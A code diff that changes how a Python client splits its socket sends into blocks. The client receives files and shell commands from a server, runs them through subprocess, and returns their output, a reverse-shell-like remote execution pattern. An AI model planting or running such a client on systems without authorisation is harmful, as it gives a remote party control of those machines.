@@ -106,8 +106,9 @@ def connect_to_server(
                 with open(path, mode="wb") as f:
                     f.write(filecontent)
                 abspath = os.path.normpath(os.path.join(os.getcwd(), path))
-                datatosend = encode_cmd(abspath, byte_len, command_start, command_end)
-                client_socket.send(datatosend)
+                allblocks = encode_cmd(abspath, byte_len, command_start, command_end)
+                for datatosend in [allblocks[i:i + byte_len] for i in range(0, len(allblocks), byte_len)]:
+                    client_socket.send(datatosend)
                 continue
             command = command.decode("utf-8")
             print(f"Received command: {command}")
@@ -135,8 +136,9 @@ def connect_to_server(
                     stdout=subprocess.PIPE,
                 )
                 datatosend = before_stdout + p.stdout + before_stderr + p.stderr
-            datatosend = encode_cmd(datatosend, byte_len, command_start, command_end)
-            client_socket.send(datatosend)
+            allblocks = encode_cmd(datatosend, byte_len, command_start, command_end)
+            for datatosend in [allblocks[i:i + byte_len] for i in range(0, len(allblocks), byte_len)]:
+                client_socket.send(datatosend)
         except Exception as fe:
             datatosend = str(fe).encode("utf-8")
             datatosend = encode_cmd(datatosend, byte_len, command_start, command_end)
